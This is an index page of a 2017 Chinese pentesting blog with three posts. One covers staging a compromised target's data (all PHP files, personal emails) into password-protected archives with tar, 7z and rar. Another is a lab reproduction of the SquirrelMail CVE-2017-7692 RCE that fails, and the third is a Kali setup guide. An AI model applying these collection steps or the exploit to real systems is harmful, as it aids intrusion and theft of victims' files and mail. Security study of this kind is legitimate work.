<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="知道自己想要做什么,比怎么做更重要">
    

    <!--Author-->
    
        <meta name="author" content="klion">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="klion&#39;s blog"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="知道自己想要做什么,比怎么做更重要" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="klion&#39;s blog"/>

    <!--Type page-->
    
        <meta property="og:type" content="website" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>page - klion&#39;s blog</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    主页
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    所有文章
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about">
                    关于自己
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    标签
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    分类
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/contact">
                    一起交流
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
            <h1 id="main-title" class="title">klion's blog</h1>
        
    </div>
</header>

        <section class="main">
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/04/24/tar-file/">
                利用目标系统现有工具快速打包目标机器数据
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-04-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/tar-file/">tar file</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br></p>
<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;几乎对所有渗透者来讲,初衷或者最终目的无非就是想对目标实施长期监控,但,具体怎么监控呢[好吧,那又是个非常大的话题,个人能力现在实在有限],无非就是下些各种各样的资料回来[当然,这可能是所有监控里面最朴实无华的一种],今天,我们单就这一点来做些简要说明,事先声明,可以写脚本[有时候确实不太灵活],但大多数脚本的核心可能还是靠这些东西,废话就先到这儿吧,希望下面的内容能帮到你,写的不好,管用就行</p>
<h5 id="在linux机器下的快速打包方式-下面这些工具一般在目标机器上都会自带"><a href="#在linux机器下的快速打包方式-下面这些工具一般在目标机器上都会自带" class="headerlink" title="在linux机器下的快速打包方式[下面这些工具一般在目标机器上都会自带]:"></a>在linux机器下的快速打包方式[下面这些工具一般在目标机器上都会自带]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">利用 <span class="string">'tar'</span>,一般在部署系统时默认都会预先装上,其它还有很多其它的压缩工具,但这里就以最常用的为例,只是打包个数据而已,哪个好用用哪个就行了,没必要在这些问题上过于纠结[我们并不是在研究压缩算法]</div><div class="line"></div><div class="line">--exclude 排除不打包的文件</div><div class="line">-c 创建文件</div><div class="line">-v 显示打包过程</div><div class="line">-f 指定要打包的文件</div><div class="line">-z 压缩</div><div class="line">-X 把要排除的文件名事先写到文件中然后指定它就可以排除多个了</div><div class="line">-C 解压到指定目录中</div><div class="line">-p 打包的时候保持原有文件属性</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">以 gunzip 格式压缩解压:</div><div class="line"></div><div class="line"><span class="comment"># find / -name '*.php' -type f | wc -l</span></div><div class="line"><span class="comment"># tar zcf /tmp/phpfile.tar.gz `find / -name '*.php' -type f` 2&gt; /dev/null &amp;&amp; cd /tmp &amp;&amp; ls ./phpfile.tar.gz &amp;&amp; echo $? &amp;&amp; tar tf phpfile.tar.gz  | wc -l  会带上原有的目录结构</span></div><div class="line"><span class="comment"># tar xf phpfile.tar.gz -C ./  解压</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">以 bzip 格式压缩解压:</div><div class="line"></div><div class="line"><span class="comment"># tar jcf access.tar.bz access*   	bzip格式打包压缩文件</span></div><div class="line"><span class="comment"># tar jxf access.tar.bz  		zip解压缩</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">针对大文件的分卷压缩解压:</div><div class="line"></div><div class="line"><span class="comment"># tar cjf - /usr/local/apache2/htdocs/ | split -b 1m - www.bz2 2&gt;/dev/null  1m大小分割,直接压缩到当前目录下</span></div><div class="line"><span class="comment"># cat www.bz2a* | tar xj   分割压缩后的解压方法</span></div><div class="line"><span class="comment"># ls -lR usr/</span></div></pre></td></tr></table></figure>
<p><br>    </p>
<h5 id="在win机器上的一些快速打包方式-通常会配合dir-findstr一起使用-打包一些个人的邮件-还是比较好使的"><a href="#在win机器上的一些快速打包方式-通常会配合dir-findstr一起使用-打包一些个人的邮件-还是比较好使的" class="headerlink" title="在win机器上的一些快速打包方式[ 通常会配合dir,findstr一起使用,打包一些个人的邮件,还是比较好使的 ]:"></a>在win机器上的一些快速打包方式[ 通常会配合dir,findstr一起使用,打包一些个人的邮件,还是比较好使的 ]:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="number">7</span>z [压缩比相对较高的一种压缩格式,win下首推]:	</div><div class="line">-r 递归压缩</div><div class="line">-o 指定要输出到的目录</div><div class="line">-p 指定密码</div><div class="line">-v 分卷压缩,给的务必要适量,否则文件会非常多</div><div class="line">a 添加压缩文件</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">普通压缩解压方式:</div><div class="line"></div><div class="line"><span class="comment"># 7z.exe -r -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*</span></div><div class="line"><span class="comment"># 7z.exe x -padmin drupal754.7z -oc:\xl</span></div></pre></td></tr></table></figure>
<p><img src="/img/7z add.png" alt=""><br><br><img src="/img/woricaonima.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">分卷压缩解压方式:</div><div class="line"></div><div class="line"><span class="comment"># 7z.exe -r -v1m -padmin a c:\drupal754.7z C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*</span></div><div class="line"><span class="comment"># 7z.exe x -padmin drupal754.7z.001 -oc:\xl</span></div></pre></td></tr></table></figure>
<p><img src="/img/caonima1.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">rar [把安装好的winrar安装目录的rar.exe提取出来就可以直接用了,前提是你安装winrar的系统和目标的系统版本要对应,不然可能有些问题(自己觉得库应该是兼容的)]:</div><div class="line"></div><div class="line">-a  	添加要压缩的文件</div><div class="line">-p  	指定压缩密码</div><div class="line">-r     递归压缩,默认只压根目录,需要先注册下,把rarreg.key丢到安装winrar目录即可</div><div class="line">-x 	 指定要排除的文件,单位 k,m,g</div><div class="line">-v 	 分卷打包,后面跟上单位就好了,打包大文件会很有用</div><div class="line">-m3,<span class="number">4</span> 	使用较好的压缩方式,速度可能会有些慢</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">以 rar 格式压缩解压:</div><div class="line"><span class="comment"># Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*  	把指定目录下的所有文件[包括所有子目录及子目录中的文件,排除txt文件]带密码压缩,然后把压缩好的文件放到c的根下命名成drupal754.rar</span></div><div class="line"><span class="comment"># Rar.exe x -padmin c:\drupal754.rar c:\xl	带密码保留原有目录结构解压</span></div></pre></td></tr></table></figure>
<p><img src="/img/caonima11.png" alt=""><br><img src="/img/rar shits.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">以 zip 格式压缩解压[用法同上]:</div><div class="line"><span class="comment"># Rar.exe a -r -padmin -m3 -x*.txt -ta c:\drupal754.zip C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.*</span></div><div class="line"><span class="comment"># Rar.exe x -padmin c:\drupal754.zip c:\xl</span></div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">分卷压缩解压:</div><div class="line"><span class="comment"># Rar.exe a -r -v1m -padmin -m3 -x*.txt -ta c:\drupal754.rar C:\AppServ\www\drupal-7.54-vuln-sqli-rce\*.* 压缩</span></div><div class="line"><span class="comment"># Rar.exe x -padmin c:\drupal754.part01.rar c:\xl	解压</span></div></pre></td></tr></table></figure>
<p><img src="/img/rar v part.png" alt=""><br><br><br></p>
<h5 id="后话"><a href="#后话" class="headerlink" title="后话:"></a>后话:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;很显然,通关全文,跟技术几乎没有任何关系[仅仅就是几个小工具的简单使用而已],就当留个备忘吧,留给有需要的朋友,另外,打包的时候务必注意下目标分区的大小,不然空间不够,容易出错,文件的元数据要不要一并保存,正在打包的文件是否被占用什么的,有时候打包可能还会有些小小的问题,相信那对你都不是问题<br><br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/04/24/SquirrelMail-RCE/">
                SquirrelMail < 1.4.23 RCE (CVE-2017-7692) 利用小记 [ 尼玛,多次尝试未果,待解决…… ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-04-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/SquirrelMail-Rce/">SquirrelMail Rce</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,SquirrelMail 就不用多说了吧[一套开源的php 邮件程序][说实话,用这套程序的目标还是蛮多的,尼玛,不说了,都是泪……],在重现漏洞利用之前,我们需要先把邮件服务器简单搭起来,这里以centos 6.8 x86 [为了避免安装过程出问题,iptables和selinux已事先全部关闭],大致过程如下,下面是具体的测试环境:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">kali</span> 2017: 执行<span class="selector-tag">SquirrelMail_RCE_exploit</span><span class="selector-class">.sh</span>  利用脚本</div><div class="line"><span class="selector-tag">centos</span> 6<span class="selector-class">.8</span> <span class="selector-tag">x86</span>:  完全模拟真实的生产环境,<span class="selector-tag">lamp</span>全程源码包编译配置<span class="selector-attr">[后期会把各种配置细节更新上来]</span></div><div class="line"><span class="selector-tag">SquirrelMail</span>版本 1<span class="selector-class">.4</span><span class="selector-class">.20</span></div></pre></td></tr></table></figure></p>
<p>2,安装前的一点准备工作:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rpm -qa sendmail		检查当前系统有没有装sendmail</span></div><div class="line"><span class="meta">#</span><span class="bash"> rpm -e sendmail 		如果装了,就暂时先把它卸载掉</span></div></pre></td></tr></table></figure></p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># vi /etc/hosts			修改本机host文件,添加下面的指向</div><div class="line"><span class="number">192.168</span><span class="number">.3</span><span class="number">.30</span> admin.rootkit.org  server</div></pre></td></tr></table></figure>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/sysconfig/network	修改当前系统的机器名 </span></div><div class="line"><span class="attr">HOSTNAME</span>=admin.rootkit.org</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> shutdown -r now</span></div><div class="line"><span class="meta">#</span><span class="bash"> rpm -ivh http://dl.fedoraproject.org/pub/epel/6/i386/epel-release-6-8.noarch.rpm  安装epel源</span></div></pre></td></tr></table></figure>
<p>3,安装,配置,测试Postfix [一款经典的smtp服务器,默认端口25]:<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># yum install postfix -y</span></div><div class="line"><span class="comment"># vi /etc/postfix/main.cf</span></div><div class="line">  <span class="attr">myhostname</span> = admin.rootkit.org	</div><div class="line">  <span class="attr">mydomain</span> = rootkit.org</div><div class="line">  <span class="attr">myorigin</span> = $mydomain</div><div class="line">  <span class="attr">inet_interfaces</span> = all</div><div class="line">  <span class="attr">inet_protocols</span> = all</div><div class="line">  <span class="attr">mydestination</span> = $myhostname, localhost.$mydomain, localhost, $mydomain</div><div class="line">  <span class="attr">mynetworks</span> = <span class="number">192.168</span>.<span class="number">3.0</span>/<span class="number">24</span>, <span class="number">127.0</span>.<span class="number">0.0</span>/<span class="number">8</span></div><div class="line">  <span class="attr">home_mailbox</span> = Maildir/</div></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/postfix start</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/postfix status</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | grep <span class="string">"25"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --level 2345 postfix on</span></div></pre></td></tr></table></figure>
<p><img src="/img/postfix start.png" alt=""><br></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> useradd admin</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"admin"</span> | passwd --stdin admin</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install telnet -y   可能没有,顺便装下即可</span></div></pre></td></tr></table></figure>
<figure class="highlight pf"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet localhost smtp</span></div><div class="line">  ehlo localhost	</div><div class="line">  mail <span class="keyword">from</span>:<span class="variable">&lt;admin&gt;</span>	发件人</div><div class="line">  rcpt <span class="keyword">to</span>:<span class="variable">&lt;admin&gt;</span>  	收件人</div><div class="line">  data </div><div class="line">  welcome <span class="keyword">to</span> klion's mail server </div><div class="line">  .  表示写信结束</div><div class="line">  quit  退出后会自动发送邮件</div></pre></td></tr></table></figure>
<p><img src="/img/postfix config res.png" alt=""><br></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">查看收到的邮件内容</div><div class="line"><span class="meta">#</span><span class="bash"> ls /home/admin/Maildir/new/</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /home/admin/Maildir/new/1497007106.V802I1600f7M865561.admin.rootkit.org</span></div></pre></td></tr></table></figure>
<p><img src="/img/postfix config res send.png" alt=""><br></p>
<p>4,安装,配置,测试 Dovecot [一款开源的 IMAP/POP3 邮件服务器,默认端口110,143]<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> yum install dovecot -y</span></div><div class="line"><span class="meta">#</span><span class="bash"> vi /etc/dovecot/dovecot.conf</span></div><div class="line">  protocols = imap pop3 lmtp   让它支持邮局协议</div></pre></td></tr></table></figure></p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># <span class="keyword">vi</span> /etc/dovecot/<span class="keyword">conf</span>.d/<span class="number">10</span>-mail.<span class="keyword">conf</span></div><div class="line">  mail_location = maildir:~/Maildir</div></pre></td></tr></table></figure>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/dovecot/conf.d/10-auth.conf</span></div><div class="line">  <span class="attribute">disable_plaintext_auth</span> = <span class="literal">yes</span>   不允许明文验证</div><div class="line">  auth_mechanisms = plain login</div></pre></td></tr></table></figure>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/dovecot/conf.d/10-master.conf</span></div><div class="line">  unix_listener auth-userdb &#123;</div><div class="line">  	#mode = 0600</div><div class="line"><span class="built_in">	user </span>= postfix</div><div class="line"><span class="built_in">	group </span>= postfix</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/dovecot start</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/dovecot status</span></div><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --level 2345 dovecot on</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tuln | grep -E <span class="string">"110|143"</span></span></div></pre></td></tr></table></figure>
<p><img src="/img/dovecot start.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># telnet localhost pop3</span></div><div class="line">  user admin</div><div class="line">  pass admin</div><div class="line">  list</div><div class="line">  retr <span class="number">1</span></div><div class="line">  quit</div></pre></td></tr></table></figure>
<p><img src="/img/dovecot start res.png" alt=""><br></p>
<p>5,下载,配置squirrelmail程序[如果你不想把它放到二级目录,另外再配个虚拟主机也是一样的]:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> wget http://pkgs.fedoraproject.org/repo/pkgs/squirrelmail/squirrelmail-1.4.20-RC2_20090917.tar.bz2/e1828757b34c658a061b009da311f1df/squirrelmail-1.4.20-RC2_20090917.tar.bz2</span></div><div class="line"><span class="meta">#</span><span class="bash"> tar -jxf squirrelmail-1.4.20-RC2_20090917.tar.bz2</span></div><div class="line"><span class="meta">#</span><span class="bash"> mv squirrelmail-1.4.20-RC2 /usr/<span class="built_in">local</span>/apache2/htdocs/squirrelmail</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> squirrelmail/</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir attach</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod 755 attach/ data/</span></div><div class="line"><span class="meta">#</span><span class="bash"> cp config/config_default.php config/config.php</span></div></pre></td></tr></table></figure></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> vi config/config.php    编辑squirrelmail的主配置文件,修改如下变量</span></div><div class="line"><span class="meta">  $</span><span class="bash">domain = <span class="string">'rootkit.org'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">smtpServerAddress = <span class="string">'localhost'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">imap_server_type = <span class="string">'dovecot'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">data_dir = <span class="string">'/usr/local/apache2/htdocs/squirrelmail/data/'</span>;</span></div><div class="line"><span class="meta">  $</span><span class="bash">attachment_dir = <span class="string">'/usr/local/apache2/htdocs/squirrelmail/attach/'</span>;</span></div><div class="line"><span class="meta">#</span><span class="bash"> chmod -R 777 squirrelmail/ 这里为了权限就给的大了点,要不,程序不能写,没法初始化</span></div></pre></td></tr></table></figure>
<p>6,所有配置完成后,尝试登陆webmail [1.4.20版本]:<br><img src="/img/postfix final login.png" alt=""><br><br><img src="/img/postfix final.png" alt=""><br></p>
<p>7,关于漏洞的产生细节,这里就不细说了,网上到处都是,直接来看看看具体的利用过程吧,其实非常简单:<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi SquirrelMail_RCE_exploit.sh   因为我这里的路径不是默认的,所以需要先到脚本中去稍微改下</span></div><div class="line">  <span class="attribute">sqspool</span>=<span class="string">"/usr/local/apache2/htdocs/squirrelmail/attach"</span></div></pre></td></tr></table></figure></p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># ./SquirrelMail_RCE_exploit.sh http:<span class="comment">//admin.rootkit.org/squirrelmail</span></span></div></pre></td></tr></table></figure>
<p><img src="/img/squiremail mail failed.png" alt=""><br></p>
<p>8,原谅我等了很久shell也没弹回来,开始以为是shell的问题,后来去看了下代码,很简单啊,本质上还是用bash弹的,也看不出啥情况<br><img src="/img/php revver shell.png" alt=""><br></p>
<p>9,后来仔细看了弹回来的html,原来是发邮件的时候报错了,”501 5.1.7 Bad sender address syntax” ,510错误,谷歌知,可能是发信的格式不正确,然后,就又看了下发信的代码,发现拼接貌似也没什么问题呀,难道是locahost不对,然后我就去掉了localhost试了一下,结果然并卵,感觉不大可能是邮件服务器的配置问题,真心希望哪位表哥要是成功了,能放出来让小弟好好学习下,小弟感激不尽<br><img src="/img/sendmail rce.png" alt=""><br><img src="/img/squireeemail error.png" alt=""><br></p>
<p><br></p>
<h5 id="遗言"><a href="#遗言" class="headerlink" title="遗言:"></a>遗言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;脑袋已死,等待表哥们救援中……</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2017/04/24/kali-config/">
                kali 安装后的简要配置指南
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2017-04-24</span>
            
            
            
                <span class="category">
                    <a href="/categories/kali-config/">kali config</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,最近刚好看到kali有更新,想想自己用的系统似乎也很久没更新过了,这里就顺手记录了下关于部署渗透系统的一些心得,留给有需要的朋友做些简单参考,首先,到kali的官网去下载最新版的kali镜像或者镜像虚拟机,这里我就直接用它已经配好的虚拟机来做演示说明<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-amd64.<span class="number">7</span>z</div><div class="line"><span class="symbol">https:</span>/<span class="regexp">/images.offensive-security.com/virtual</span>-images/Kali-Linux-<span class="number">2017.1</span>-vm-i686.<span class="number">7</span>z</div></pre></td></tr></table></figure></p>
<p>2,镜像下载好以后,解压镜像文件,然后到VMware中选择并打开该虚拟机,进入系统,编辑source.list文件,修改为官方的apt源,强烈建议这里用官网的源,尽量不要用任何第三方源,务必谨记<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /etc/apt/sources.list</span></div></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">deb <span class="symbol">http:</span>/<span class="regexp">/http.kali.org/kali</span> kali-rolling main non-free contrib</div></pre></td></tr></table></figure>
<p>3,先装好一些自己常用的vpn客户端,因为等会要全部连vpn操作,所以,需要事先装下,我自己是这样的的习惯,你大可不必如此<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get update 先刷下缓存,要不然可能会提示找不到软件包</span></div><div class="line"><span class="comment"># apt-get install network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome</span></div></pre></td></tr></table></figure></p>
<p>4,配置并连接pptp<br><img src="/img/vpn_configses.png" alt="vpn"><br></p>
<p>5,vpn连上没什么问题以后,再次刷新软件包缓存,注意这里单单只是刷新一下哈,千万不要更新哦<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get update</span></div></pre></td></tr></table></figure></p>
<p>6,安装内核头文件,在编译一些工具时经常要用到该头文件,如果你跟我一样,也直接用的是kali提供好的vmware虚拟机,默认头文件是已经装好了的,因为在装vmtools时要用这个头文件<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># apt-get install linux-headers-`uname -r`</span></div></pre></td></tr></table></figure></p>
<p>7,删除所有的登陆提示,关于系统的简单优化,还有很多,这里就不一一说了<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># &gt; /etc/issue</span></div><div class="line"><span class="comment"># &gt; /etc/issue.net</span></div></pre></td></tr></table></figure></p>
<p>8,修复wireshark启动报错,这时自己用过的’最好的’渗透工具,没有之一<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi /usr/share/wireshark/init.lua</span></div></pre></td></tr></table></figure></p>
<p>9,配置符合自己操作习惯的一些环境变量,这儿只是给大家做些简单参考,按照你自己实际的习惯来即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># vi ~/.bashrc</span></div></pre></td></tr></table></figure></p>
